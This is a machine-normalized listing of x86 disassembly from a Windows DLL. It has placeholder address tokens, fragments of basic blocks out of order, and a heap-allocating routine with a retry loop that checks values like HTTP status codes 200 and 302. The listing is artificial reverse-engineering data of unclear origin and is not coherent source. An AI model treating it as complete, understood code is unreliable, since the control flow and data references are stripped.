jmp r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
mov edx [ ebp - 0x90 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x94 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xcc
call sub_100050e0
mov [ ebp - 0x9c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x94 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x9c ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10068700
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
sub eax 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x77
dec eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ esi ] eax
mov eax [ ecx + 0x1c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x76
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_100050e0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1006877d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_100687d0
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
lea ebx [ esi + 0x5c ]
push r--data
xor edi edi
mov ecx ebx
call sub_10039b60
mov edi 0x8
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
cmp [ ebx + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
mov ebx [ ebx ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc4 ]
call eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ esi + 0xc4 ]
push 0x0
push 0x0
push ebx
push 0x3
push eax
call ecx
mov eax [ eax ]
mov ecx eax
mov [ esi + 0xb8 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] edi
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x1 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xbc ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
pop edi
pop ebx
xor eax eax
pop esi
retn
mov ecx [ esi + 0xb8 ]
mov edx [ esi + 0xd4 ]
push ecx
call edx
pop edi
pop ebx
mov [ esi + 0xb8 ] 0x0
mov eax 0x2
pop esi
retn
sub_100688a0
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] esi
call sub_100014b7
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10050f50
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_100688e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081741
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x198 ] eax
cmp [ eax + 0xec ] ebx
jne r-xdata
push ebx
push r--data
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x1b4 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0xa8 ] 0xf
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xbc ] bl
call sub_10043190
cmp [ ebp + 0x10 ] 0x2
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov edi [ ebp - 0x1b4 ]
lea esp [ esp ]
push ebx
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
call sub_10043190
push 0x8
lea eax [ ebp - 0x180 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100074a0
mov edi [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x74 ] ebx
lea esi [ ebp - 0x190 ]
sete al
xor ecx ecx
cmp al bl
sete cl
add ecx 0x6
push ecx
call sub_10023b00
mov [ ebp - 0x4 ] 0x3
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
cmp edi ebx
je r-xdata
push esi
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0xd8 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_10050437
mov eax 0x43
jmp r-xdata
mov ecx [ ebp - 0xbc ]
push ecx
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x198 ]
mov ecx [ edx + 0xec ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ebp - 0x1a8 ]
push edx
lea edx [ ebp - 0x1a4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x19c ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
mov ecx [ ebp - 0x1a8 ]
mov esi eax
mov eax [ ebp - 0x1a4 ]
inc edi
cmp eax 0x12e
je r-xdata
push 0xdac
call [ Sleep@IAT ]
push edi
push esi
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x1a0 ] eax
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
mov [ ebp - 0x191 ] 0x1
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0x12c ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
cmp esi ebx
jne r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x1a8 ] ebx
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
push 0x3
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
cmp edi 0x5
jg r-xdata
cmp eax 0xc8
je r-xdata
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0x110 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
cmp [ ebp - 0x191 ] 0x1
jne r-xdata
cmp eax 0x12e
jne r-xdata
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x8c ] 0xf
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x7
push 0x1
lea ecx [ ebp - 0xa0 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_10050437
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
push r--data
push r--data
jmp r-xdata
xor eax eax
mov edx [ ebp - 0xbc ]
push edx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0xa0 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_10050437
call sub_10067f90
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
push 0x1
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x1b0 ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0x148 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x38 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
mov edx [ ebp - 0x198 ]
push eax
push edx
lea edi [ ebp - 0x148 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x1c4 ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0x164 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xb
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0x164 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0xe0 ] 0xf
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x74 ] ebx
je r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x1a0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov edi eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x18c ]
mov ecx [ ebp - 0x190 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0x30 ]
push r--data
push edx
call sub_100430c0
add esp 0xc
push eax
lea ecx [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000adb0
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1006591f
add esp 0x4
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0xf4 ]
call sub_1001a220
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push r--data
call sub_10050437
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1000e9c0
mov [ ebp - 0x1c0 ] eax
push r--data
call sub_10050437
mov ecx [ ebp - 0x19c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x14
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x1c
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x1bc ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x17
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x38
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x1b0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1a
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x54
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x1c4 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1d
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x70
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x1b8 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1f
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x20
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x8c
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x74 ] ebx
je r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
lea edi [ ebp - 0x190 ]
call sub_10055ba0
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x25
call sub_1000adb0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov ecx [ ebp - 0x1c0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x22
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x23
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x24
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0xa8
push esi
call sub_10035d20
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x19c ] ecx
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov edi 0xf
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
cmp [ ebp - 0x150 ] esi
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0xac ]
mov [ ebp - 0x1a0 ] edx
cmp [ ebp - 0xe0 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x150 ] edi
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x164 ] bl
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov ecx [ ebp - 0x164 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x148 ] bl
cmp [ ebp - 0x8c ] esi
jb r-xdata
mov edx [ ebp - 0x148 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
cmp [ ebp - 0xfc ] esi
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x12c ] bl
cmp [ ebp - 0xc4 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x190 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x188 ] ebx
cmp [ ebp - 0x16c ] esi
jb r-xdata
mov ecx [ ebp - 0x1ac ]
push ecx
mov ecx [ ebp - 0x18c ]
lea edx [ ebp - 0x184 ]
push edx
push ecx
push eax
call sub_10011560
mov edx [ ebp - 0x190 ]
push edx
call sub_1006591f
add esp 0x14
mov [ ebp - 0x4 ] bl
